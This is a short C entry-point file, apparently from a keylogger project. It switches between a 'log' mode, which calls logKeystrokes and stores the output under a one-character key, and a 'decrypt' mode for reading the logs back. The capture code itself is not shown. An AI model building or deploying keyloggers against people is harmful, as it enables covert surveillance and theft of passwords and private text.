#include <stdio.h>
#include <stdlib.h>
#include "../include/keylogger.h"
#include "../include/decryption.h"

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <log|decrypt> [key] [inputFile] [outputFile]\n", argv[0]);
        return 1;
    }

    char mode = argv[1][0];
    char key = (argc > 2) ? argv[2][0] : 'K';
    const char *inputFile = (argc > 3) ? argv[3] : "encrypted.txt";
    const char *outputFile = (argc > 4) ? argv[4] : "decrypted.txt";

    if (mode == 'l') {
        logKeystrokes(inputFile, key);
    } else if (mode == 'd') {
        decryptFile(inputFile, outputFile, key);
    } else {
        printf("Invalid mode. Use 'log' for logging and 'decrypt' for decryption.\n");
    }

    return 0;
}
